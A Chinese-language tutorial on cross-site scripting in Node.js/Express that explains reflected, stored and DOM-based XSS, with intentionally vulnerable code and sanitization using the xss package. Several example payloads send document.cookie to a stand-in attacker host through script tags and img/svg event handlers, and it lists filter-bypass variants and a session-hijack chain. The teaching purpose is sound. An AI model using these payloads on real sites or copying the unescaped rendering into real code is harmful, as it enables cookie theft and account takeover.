# XSS 攻击示例

以 Node.js + Express 为例，展示三种常见 XSS 攻击方式。

---

## 1. 反射型 XSS（最常见）

攻击者构造恶意 URL，诱骗用户点击。

### 漏洞代码

```typescript
// 搜索接口 — 直接把用户输入拼到 HTML 返回
app.get('/search', (req, res) => {
  const keyword = req.query.keyword;
  res.send(`
    <h1>搜索结果</h1>
    <p>您搜索的关键词：${keyword}</p>
  `);
});
```

### 攻击 URL

```
https://example.com/search?keyword=<script>document.location='https://hacker.com/steal?cookie='+document.cookie</script>
```

用户点击后，浏览器执行了 `<script>` 标签，Cookie 被发到攻击者服务器。

### 更隐蔽的变体

```
# 不用 <script>，绕过简单过滤
?keyword=<img src=x onerror="fetch('https://hacker.com/steal?c='+document.cookie)">

# 用 SVG
?keyword=<svg onload="fetch('https://hacker.com/steal?c='+document.cookie)">

# 编码绕过
?keyword=%3Cscript%3Ealert(document.cookie)%3C/script%3E
```

---

## 2. 存储型 XSS（危害最大）

恶意脚本存入数据库，所有访问该页面的用户都会中招。

### 漏洞代码

```typescript
// 评论接口 — 未过滤直接存库
app.post('/comments', (req, res) => {
  const comment = req.body.content;
  db.collection('comments').insertOne({ content: comment });
  res.json({ success: true });
});

// 渲染评论 — 直接输出
app.get('/comments', async (req, res) => {
  const comments = await db.collection('comments').find().toArray();
  res.send(`
    <h1>评论区</h1>
    ${comments.map(c => `<div class="comment">${c.content}</div>`).join('')}
  `);
});
```

### 攻击载荷（提交评论时）

```json
{
  "content": "好文章！<img src=x onerror=\"fetch('https://hacker.com/steal?c='+document.cookie)\">"
}
```

这条评论存入数据库后，**每个打开评论页的用户**都会触发恶意脚本，Cookie 全部被盗。

---

## 3. DOM 型 XSS

前端 JS 直接把用户输入插入 DOM，不经过服务端。

### 漏洞代码

```typescript
// 前端代码
const hash = location.hash.substring(1); // 从 URL hash 取值
document.getElementById('output').innerHTML = decodeURIComponent(hash);
```

### 攻击 URL

```
https://example.com/page#<img src=x onerror="alert(document.cookie)">
```

---

## 真实场景完整攻击链

以一个"修改昵称"功能为例：

```typescript
// ❌ 漏洞代码 — 未做 XSS 过滤
@Put('/profile')
async updateProfile(@Body() dto: UpdateProfileDto) {
  // dto.nickname = '<script>fetch("https://hacker.com/steal?c="+document.cookie)</script>'
  await this.userService.updateNickname(userId, dto.nickname);
  return { success: true };
}
```

攻击链：

1. 攻击者把昵称改成恶意脚本
2. 存入 MongoDB
3. 其他用户查看该用户资料页
4. Cookie 被盗
5. 攻击者用 Cookie 冒充受害者登录

---

## 用 xss 包过滤后的效果

```typescript
import xss from 'xss';

const malicious = '<script>fetch("https://hacker.com/steal?c="+document.cookie)</script>';

xss(malicious);
// 输出: '&lt;script&gt;fetch("https://hacker.com/steal?c="+document.cookie)&lt;/script&gt;'
// 脚本标签被转义，不会执行

const malicious2 = '<img src=x onerror="alert(1)">';
xss(malicious2);
// 输出: '<img src="x">' 
// onerror 事件被移除，img 标签保留 img 标签但安全
```

---

## 速查表

| 类型 | 触发方式 | 危害 | 防御 |
|------|---------|------|------|
| 反射型 | 诱骗点击恶意 URL | 单个用户 | 输入过滤 + 输出转义 |
| 存储型 | 恶意脚本存入数据库 | **所有访问用户** | 输入过滤 + 输出转义 |
| DOM 型 | 前端 JS 操作 DOM | 单个用户 | 不用 innerHTML，用 textContent |

**核心原则：永远不信任用户输入，入库前过滤，出库渲染时转义。**
